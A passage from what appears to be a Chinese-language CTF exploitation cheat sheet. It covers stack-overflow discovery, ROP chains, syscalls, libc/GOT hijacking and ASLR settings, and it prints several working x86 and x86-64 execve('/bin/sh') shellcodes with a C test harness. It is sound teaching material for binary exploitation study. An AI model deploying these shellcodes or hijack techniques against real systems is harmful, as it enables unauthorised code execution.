若复制成功返回目标位置的指针，否则返回空指针 </span></span><br></pre></td></tr></table></figure></li><li><p>strcat</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 src 添加到 dest 的末尾，删除 dest 末尾的 \0，连同 src 中的 \0 一起复制到 dest 的末尾 </span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line"><span class="comment">//dest: 目标字符串的指针 </span></span><br><span class="line"><span class="comment">//src: 要追加的字符串的指针 </span></span><br><span class="line"><span class="comment">// 返回指向 dest 的指针 </span></span><br></pre></td></tr></table></figure></li></ul><p> 栈溢出寻找方法：</p><ol><li><p> 在函数中寻找类似于 buf 的局部变量 </p></li><li><p> 在函数中找到向该 buf 写入数据的函数 </p></li><li><p> 检查可写入的最大大小是否能够超过 buf 定义大小 </p></li><li><p> 若可以溢出，则查看 buf 在栈中的位置，寻找 buf 之后是否有其他局部变量，或者是否可以溢出到 ret</p></li><li><p> 计算出 buf 到达目标的总长度，进行溢出，目标可以是 ret，buf 之后的其他局部变量或者 bss 段上的某些全局变量 </p></li></ol><p> 基本套路：</p><ol><li> 检查程序的防护措施与运行平台 </li><li> 是静态编译还是动态编译 </li><li> 找到溢出点并且想办法劫持程序流程 </li><li> 静态编译会提供大量的 gadgets，需要利用 ROP 跳转到 shellcode 或者拼凑出系统调用 </li><li> 动态编译则需要想办法泄漏出一个 libc 中的地址，最后利用 libc 中的 system 执行命令 </li><li> 拿到 libc 的地址以后找到对应版本的 libc（如果题目没有提供 libc）</li><li> 计算出 libc 的基地址，进而计算出 system 的地址 </li><li> 跳转到 system 从而 getshell</li></ol><p> 其实栈溢出的目的就是劫持控制流，也就是控制 eip 寄存器，而 eip 寄存器又何 esp，ebp 息息相关，如果可以在 ret 指令之前控制 esp 的话，甚至不用覆盖 ret 也可以劫持控制流，或者如果控制 ebp 的话甚至可以控制栈低后面的 ret。</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP 即 Return-Oriented programming（面向返回编程），其最大的作用就是可以绕过多种安全保护措施，并且可以帮助我们 Getshell。ROP 是指利用程序中碎小的代码片段来操作寄存器，甚至改变程序流程的技术，这些小的代码片段被称为 gadgets。一个 gadget 通常是以 ret 或者 jmp 等跳转指令结尾的代码片段，最常用的是以 ret 结尾，ret 指令可以从栈顶弹出一个值到 eip 中，控制程序下一条指令的地址，如果我们可以控制栈上的元素，就可以利用多个 gadgets 形成 ROP 链，不过需要事先得知每个 gadget 的地址。</p><p> 通常使用静态编译的程序中会包含大量可用的 gadgets，动态编译的程序中也含有少量可以使用的 gadgets，收集到足够多的 gadgets 以后就可以修改寄存器的值并且控制程序的流程。利用多个 gadgets 修改寄存器以后可以直接调用 syscall，也可以直接跳转到写入内存中的 shellcode 的地址，或者跳转到 libc 中可以执行系统命令函数的地址。</p><p>ROP 技术需要有一定汇编指令的基础，并且关键在于如何合理组合各种 gadgets 形成完美的 ROP 链。ROP 链首先需要从栈溢出修改返回地址开始，最后结束于各种可以 getshell 的方式。一个简单的 ROP 示例如下，假设目前已经在程序中找到了一个可用的 ROP 链，这里以 64 位为例，并且最终目的是调用 execve 的系统调用。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Gadgets:</span><br><span class="line">    0x400686 : pop rdi ; ret</span><br><span class="line">    0x4101f3 : pop rsi ; ret</span><br><span class="line">    0x4498b5 : pop rdx ; ret</span><br><span class="line">    0x415664 : pop rax ; ret</span><br><span class="line">    0x40129c : syscall</span><br></pre></td></tr></table></figure><p>ROP 的目的就是在程序中需找大量可以控制寄存器与程序流程的汇编指令，例如各种 pop 指令，call 指令与 jmp 指令，并且将这些指令通过栈串联起来，此外如果程序中没有合适的指令，也可以通过指令偏移构造合适的指令（不同的机器码解析出的指令也不同）。</p><p> 栈溢出发生后栈中情况如下图所示，其中 addr_of_bin_sh 代表字符串 <code>/bin/sh</code> 的地址。execve 的系统调用需要 3 个参数，第一个参数是需要执行的系统命令的字符串，第二个参数是该命令的参数，第三个参数为该命令的环境变量，通常第一个参数为字符串 <code>/bin/sh</code>，第二第三个参数均为 0，代表空。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/6.png"></p><h1 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h1><p>Getshell 的方式之一。系统调用是为了用户空间与系统内核空间进行交互所提供的一组接口，在用户空间运行的程序通过 syscall 向内核发送请求，内核收到请求后负责执行，请求的参数一般通过寄存器传递，最后通过软中断使程序进入内核态执行对应操作。在 32 位系统下使用 <code>int 0x80</code> 指令启动系统调用，64 位系统下使用 <code>syscall</code> 指令。一般通过 ROP 构造系统调用，构造系统调用的过程如上节所示。常用的系统调用如下，更多的系统调用参数请参考 <code>Syscall CheatSheet</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv [], <span class="type">char</span> *<span class="type">const</span> envp [])</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br></pre></td></tr></table></figure><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>Getshell 的方式之一，主要通过 execve 系统调用执行命令。shellcode 是一组机器码，一般通过直接编写汇编语言后生成机器码，之后通过栈溢出将 shellcode 写入某个具有可执行权限的地址以后跳转到 shellcode 的地址即可执行 shellcode。</p><p>shellcode 通常越少越好，另外 shellcode 中需要避免出现坏字符 <code>\x00</code>，坏字符会导致 shellcode 写入目标地址时发生截断，如果 shellcode 中需要用到数字 0，可以利用其它方式获取，例如 <code>xor eax eax</code> 即可将 eax 置 0，此外在 shellcode 中操作立即数时，应该根据立即数的大小尽量选择合适的寄存器，例如 <code>mov al, 0x1</code> 要比 <code>mov rax, 0x1</code> 更好，后者会使 shellcode 变得更长，也可能会使 shellcode 中出现坏字符。</p><p>execve 的第一个参数也就是要执行的命令，一般都会是 <code>/bin/sh</code>，如果该字符串被保存在栈中时，由于栈是从高地址向低地址生长，因此字符串也应该反向写入栈中，另外为了内存对齐，字符串的长度需要为机器字长的倍数，所以采用 <code>//bin/sh</code>。若出于某种原因，shellcode 中无法使用栈（不能利用 pop 与 push 指令），可以先利用 write 或者 read 系统调用将字符串 <code>/bin/sh</code> 写入某个内存中的地方。若在 shellcode 执行的上下文环境中没有合适的地址，可以先执行一次 read 系统调用，部分系统调用结束以后会改变某些寄存器的值为某个地址。</p><p> 编写 shellcode 的方法如下：</p><ol><li><p> 编写对应的汇编代码（以 32 位机器为例）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; eax=11 ebx=&quot;//bin/sh&quot; ecx=[&quot;//bin/sh&quot;, NULL] edx=NULL</span><br><span class="line"></span><br><span class="line">    xor eax, eax  ; Get zero</span><br><span class="line"></span><br><span class="line">    ; The first arg</span><br><span class="line">    push eax  ; The string ending \x00</span><br><span class="line">    push 0x68732f6e</span><br><span class="line">    push 0x69622f2f  ; &quot;//bin/sh&quot;</span><br><span class="line">    mov ebx, esp  ; ebx=&quot;//bin/sh&quot;</span><br><span class="line"></span><br><span class="line">    ; NULL at argv [1]</span><br><span class="line">    push eax </span><br><span class="line">    mov edx, esp  ; edx=NULL</span><br><span class="line"></span><br><span class="line">    ; Address of &quot;//bin/sh&quot; at argv [0]</span><br><span class="line">    push ebx</span><br><span class="line">    mov ecx, esp  ;ecx=[&quot;//bin/sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">    ; Call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure></li><li><p> 汇编 </p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shell.asm</span><br></pre></td></tr></table></figure></li><li><p> 提取 shellcode 并检查是否出现 <code>\x00</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./shell |grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s//\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p> 优化 shellcode</p></li><li><p> 测试 shellcode</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -fno-stack-protector -z norelro -no-pie -z execstack shellcode.c -o shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode [] = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*func)();</span><br><span class="line">    func = (<span class="type">int</span> (*)()) shellcode;</span><br><span class="line">    (<span class="type">int</span>)(*func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p> 这里提供了一些可用的 shellcode（来自 <a href="www.exploit-db.com">exploit-db</a>）</p><ol><li><p> 前文 shellcode（x86，25 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax  ; Get zero</span><br><span class="line">push eax  ; The string ending \x00</span><br><span class="line">push 0x68732f6e</span><br><span class="line">push 0x69622f2f  ; &quot;//bin/sh&quot;</span><br><span class="line">mov ebx, esp  ; ebx=&quot;//bin/sh&quot;</span><br><span class="line"></span><br><span class="line">; NULL at argv [1]</span><br><span class="line">push eax </span><br><span class="line">mov edx, esp  ; edx=NULL</span><br><span class="line"></span><br><span class="line">; Address of &quot;//bin/sh&quot; at argv [0]</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp  ;ecx=[&quot;//bin/sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">; Call execve</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，18 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">push   0xb</span><br><span class="line">pop    eax</span><br><span class="line">push   ebx</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">int    0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，19 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">xchg ebx, esp</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，24 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov al, 0x0b</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，21 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rdi, &quot;/bin//sh&quot;</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，23 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，24 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">mov rbx, &#x27;/bin//sh&#x27;</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，30 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mov rcx, 0x1168732f6e69622f ;move the immediate value /bin/sh in hex in </span><br><span class="line">;little endian byte order into rcx padded with 11</span><br><span class="line">shl rcx, 0x08               ;left shift to trim off the two bytes of padding    </span><br><span class="line">shr rcx, 0x08               ;ringht shift to re order string</span><br><span class="line">push rcx                    ;push the immediate value stored in rcx onto the stack</span><br><span class="line">lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi</span><br><span class="line">xor rdx, rdx                ;zero out rdx for an execve argument</span><br><span class="line">mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls</span><br><span class="line">syscall                     ;make the syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，31 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rdi, rdi</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rax, rax</span><br><span class="line">push rax</span><br><span class="line">; 68 73 2f 2f 6e 69 62 2f</span><br><span class="line">mov rbx, 68732f2f6e69622fH</span><br><span class="line">push rbx</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li></ol><h1 id="Libc"><a href="#Libc" class="headerlink" title="Libc"></a>Libc</h1><p>Getshell 的方式之一。libc 是 Linux 下的一组标准函数库，包含了 C 语言最基本的函数。当程序采用动态链接时，在加载程序的时候会将指定的 libc 链接到程序，若未指定则使用操作系统当前的 libc，这样程序中才可以调用 libc 中提供的外部函数。当操作系统为程序加载完成 libc 以后，程序中需要调用的外部函数就会被放在内存中，libc 中的每个函数地址都是一个偏移量，程序加载 libc 以后确定了 libc 的基地址，再加上 libc 中函数的偏移量就可以得到 libc 中函数在内存中的真实地址，当程序调用 libc 中的外部函数时，会通过 plt 表与 got 表跳转到该函数。</p><ul><li><p>PLT 表 (Procedure Linkage Table, 程序链接表，.plt 段)<br>  用来存储程序中使用的外部函数的入口，也就是 got 表中对应的条目。位于代码段，编译时确定，没有写权限，无法修改。plt 表中第一项的作用就是跳转到 _dl_runtime_resolve 函数，函数原型为 <code>_dl_runtime_resolve (link_map_obj, reloc_index)</code>，该函数可以动态解析函数地址并且写入到 got 表中，最后还会调用被解析的函数。该条目一般由两条指令构成，第一条指令是 push 一个值到栈中，该值为 _dl_runtime_resolve 的第一个参数 link_map_obj，也就是 got 表中的第一项，第二条指令是跳转到 _dl_runtime_resolve 函数的地址，调用该函数，也就是 got 表中的第二项。其余 plt 表项一般由 3 条指令构成，第一条指令跳转到对应的 got 表条目中存储的地址，第二条指令是 push 一个值到栈中，该值就是 _dl_runtime_resolve 的第二个参数 reloc_index，第三条指令就是跳转到 plt 表的第一项，也就是调用动态链接器解析函数地址。plt 表的结构如下所示。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plt [0]:</span><br><span class="line">    push got [1]</span><br><span class="line">    jmp got [2]</span><br><span class="line">func@plt:</span><br><span class="line">    jmp func@got</span><br><span class="line">    push func_index</span><br><span class="line">    jmp plt [0]</span><br><span class="line">otherfunc@plt:</span><br><span class="line">    jmp otherfunc@got</span><br><span class="line">    push otherfunc_index</span><br><span class="line">    jmp plt [0]</span><br><span class="line">anotherfunc@plt:</span><br><span class="line">    jmp anotherfunc@got</span><br><span class="line">    push anotherfunc_index</span><br><span class="line">    jmp plt [0]</span><br></pre></td></tr></table></figure></li><li><p>GOT 表 (Global Offset Table, 全局偏移表，.got.plt 段)<br>  用来存储外部函数在内存中的地址，plt 表与 got 表中的条目是一一对应的。位于数据段，可以动态修改，具有写权限。got 表就是一个函数指针数组，其中 got 表的第一项 got [0] 是程序动态段 (.dynamic) 的装载地址，该段中保存了所有程序中需要使用的外部函数，got 表的第二项 got [1] 是 link_map_object 的地址，也就是 _dl_runtime_resolve 的第一个参数，got 表第三项 got [2] 是 _dl_runtime_resolve 函数的地址，其余条目为外部函数的地址，与 plt 表相对应，plt 表与 got 表都对应关系如下所示。</p>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           got [0] ---&gt; .dynamic address</span><br><span class="line">       |-&gt; got [1] ---&gt; link_map_object address</span><br><span class="line">plt [0] --&gt; got [2] ---&gt; _dl_runtime_resolve address</span><br><span class="line"></span><br><span class="line">plt [1] --&gt; got [3]</span><br><span class="line">plt [2] --&gt; got [4]</span><br><span class="line">plt [3] --&gt; got [5]</span><br><span class="line">...        ...</span><br></pre></td></tr></table></figure></li></ul><p> 当程序使用动态链接时，采用一种被称为延迟绑定的技术以提高程序执行效率。虽然 got 表的作用是存储所有外部函数的地址，但是当程序刚开始运行时初始 got 表中所有的条目都指向 plt 表中对应的条目（即对应 plt 条目中的第二条指令 push），而 plt 表中对应条目的作用除了跳转到 got 表中对应条目存储的地址，另外就是解析并且绑定该外部函数的地址，也就是说当程序第一次调用某个外部函数时，该函数的地址才会被解析并且写入到 got 表中，以后每次调用都会直接通过 got 表跳转到对应地址而不用重新解析地址。调用外部函数的过程如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/7.png"></p><ol><li> 首先程序中第一次调用外部函数 func，跳转到 func@plt 中 </li><li> 执行 func@plt 表中第一条指令，跳转到 func@got</li><li> 由于这是第一次调用 func，所以 func@got 表中存储的是 func@plt 中的第二条指令地址，也就是 func@plt+6</li><li> 跳转到 plt [0] 准备执行 _dl_runtime_resolve</li><li> 执行 _dl_runtime_resolve，并且修改对应的 func@got 表条目地址为真正的 func 地址，并且跳转到 func 函数的地址执行 </li><li> 第二次调用 func 函数，跳转到 func@plt 中 </li><li>func@plt 再跳转到 func@got 中 </li><li> 由于 func@got 已经被修改为 func 的真正地址，所以就可以直接跳转到 func 函数的地址执行，并且以后调用 func 函数时都可以直接执行，无需重新解析地址 </li></ol><p> 针对 libc 的利用主要是通过修改 got 表中的条目来控制执行流程，称为 got 表劫持（当然如果程序中有 libc 中的 system 函数调用就可以直接跳转到 system@plt，不过一般很少出现这种情况）。前面已经知道 got 表就是一个函数指针数组，并且可写，所以只想办法获取 system 函数在加载到程序中的 libc 中的地址，就可以修改 got 表中某个函数的地址为 system 函数的地址，例如修改 puts 函数的地址，修改完成后以后每次调用 puts 都相当于调用 system 函数。</p><p> 由于 got 表中只存储了程序中使用到的外部函数的地址，所以没有办法直接获取到 system 函数地址，但是如果知道程序使用的 libc，就可以知道 system 函数在 libc 中的地址偏移，之后再从程序中想办法拿到 libc 的基地址，两者相加就可以知道 system 函数在程序中的真实地址。</p><p> 一般的套路是想办法从程序中泄漏出一个 libc 库函数中某个函数的地址，例如 puts 函数。拿到 puts 函数的地址以后，由于 libc 的基地址低 12 位（低 3 个十六进制数）都是 0，所以只需要函数地址的低 12 位（3 个十六进制数）就可以通过偏移确定出程序使用 libc 版本，拿到 libc 以后就可以知道 system 函数与 puts 函数在 libc 中的偏移，计算出 system 函数地址的公式为 <code>system 地址 = puts 地址 - pus 偏移 + system 偏移 </code>，其中 <code>puts 地址 - puts 偏移 </code> 计算出的就是 libc 的基地址。计算出 system 的地址以后就可以通过其他方式修改 got 表中其他函数的地址，实现 got 表劫持，此外 libc 中一般都自带了字符串 <code>/bin/sh</code>，只需要知道该字符串在 libc 中的偏移地址就无需自己构造该字符串。</p><p> 需要注意的是 libc 中除了 system 还有一个函数 execve 也可以执行命令，由于 system 函数中可能会对内存对齐进行检查，导致执行失败，所以当使用 system 函数执行失败后可以在 system 函数之前的参数添加 buf 使内存对齐，或者改用 execve 函数。</p><p> 此外，在没有开启 PIE 的情况下，got 表的基地址是固定的，因此通过 IDA 获取 got 表中某条目的地址以后，修改该地址就可以劫持控制流，由于对应的 plt 表第一条指令就是 jmp 到 got 表对应条目中存储的地址，通过修改 got 表中的地址就可以直接劫持控制流，jmp 到需要的地址，这是一种很常见的劫持控制流的方法。</p><p> 为了方便我们写入 <code>/bin/sh</code>，可以直接修改 got 表上的部分函数为 system，例如 <code>strlen (user_input),strcmp (user_input,xx),strncmp (user_input,xx),memcmp (user_input,xx),atoi (user_input),free (user_input)</code>，这些函数都可以直接接收用户输入作为参数，修改为 system 就可以。</p><h1 id="Protection-Bypass"><a href="#Protection-Bypass" class="headerlink" title="Protection Bypass"></a>Protection Bypass</h1><ul><li><p>ASLR（Address Space Layout Randomization，地址空间布局随机化）</p><p>  一种由操作系统提供的保护机制，将部分内存基地址随机化使攻击者无法预测地址。大部分操作系统都默认开启 ASLR。ASLR 主要有 3 个级别：</p><ul><li><p>0 — 关闭 ASLR，每次加载程序的堆栈，libc 等地址均相同 </p></li><li><p>1 — 开启 ASLR，主要影响 mmap 基地址，栈基地址，libc 基地址 </p></li><li><p>2 — 开启强化 ASLE，在 1 级别的基础上增加了堆随机化 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 ASLR，注意在 Docker 中无法关闭 ASLR</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Canary（金丝雀）</p><p>  